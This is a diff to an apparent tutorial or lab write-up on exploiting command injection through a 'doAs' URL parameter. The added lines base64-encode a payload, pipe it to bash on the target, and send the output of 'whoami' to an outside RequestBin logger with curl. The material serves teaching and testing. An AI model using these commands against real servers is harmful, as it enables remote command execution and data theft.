@@ -163,7 +163,7 @@ curl -X "GET" http://<IP>:8080/?doAs=`<command_to_execute>`
 
 The backtick is the start of an instruction to bash to evaluate what you type as a command. Everything you type between backticks (`) is evaluated  by the shell before the main command and the output of that execution is used by that command, just as if you'd type that output at that place in the command line. So, the command between the backticks inside the URL will be firstly intepreted by our shell and then by the target shell.
 
-To read the output of the command and to check if that command was executed on the vulnerable server, we will send a request to [RequestBin](https://requestbin.io). [RequestBin](https://requestbin.io) RequestBin gives you a URL that will collect requests made to it and let you inspect them in a human-friendly way.
+To read the output of the command and to check if that command was executed on the vulnerable server, we will send a request to [RequestBin](https://requestbin.io). [RequestBin](https://requestbin.io) gives you a URL that will collect requests made to it and let you inspect them in a human-friendly way.
 
 You need just to create a subdomain by using the Create a RequestBin button:
 
@@ -175,13 +175,40 @@ Now you have an associated URL to your request bin and you can send requests to 
 curl <REQUEST-BIN-URL>
 ```
 
-<img src="./assets/requestbin2.png" width=600 height=300>
+<img src="./assets/requestbin2.png" width=800 height=400>
 
-To check if the server is vulnerable and the command was successfully executed, we would like the target server to communicate with our created logger: we will make the target to send a GET request to our REQUEST-BIN-URL. We will introduce a curl command inside the backticks that we discussed before.
+To check if the server is vulnerable and the command was successfully executed, we would like the target server to communicate with our created logger: we will make the target to send a GET request to our REQUEST-BIN-URL. We will introduce a curl command inside the backticks that we discussed before.  But first, we will encode it with base64 inside the URL and then execute it using bash command.
 
 ```
-curl -X "GET" http://<IP>:8080/?doAs=`curl <REQUEST-BIN-URL>`
+echo -n "curl <REQUEST-BIN-URL>" | base64
+curl -X "GET" http://<IP>:8080/?doAs=`echo <base_64_string> | base64 -d | bash`
 ```
+
+<img src="./assets/simplecurl.png" width=600 height=300>
+
+We can spot two GET requests as we have talked before: one request sent by our shell because of the backticks and another one interpreted by the target shell, meaning that the arget is vulnerable.
+
+<img src="./assets/requestbinget.png" width=600 height=300>
+
+But we will to extract some system information from the target, so we will try to execute a command and send it with curl. The ```-d``` parameter of curl will specify that we send a request with some data in it: that will be the output of the ```whoami``` command.
+
+Because of the ```$(whoami)``` parameter that will be interpreted by bash, we can encode the string with base64 using python:
+
+```python
+import base64
+base64.b64encode(b'curl -d $(whoami) <REQUEST-BIN-URL>')
+```
+
+<img src="./assets/pythonencode.png" width=600 height=300>
+
+
+```
+curl -X "GET" http://<IP>:8080/?doAs=`echo <base_64_string> | base64 -d | bash`
+```
+
+We can see that we have got two GET requests in our Request Bin logger. One of this contains the target username:
+
+<img src="./assets/username.png" width=600 height=300>
 
 # Further reading
 
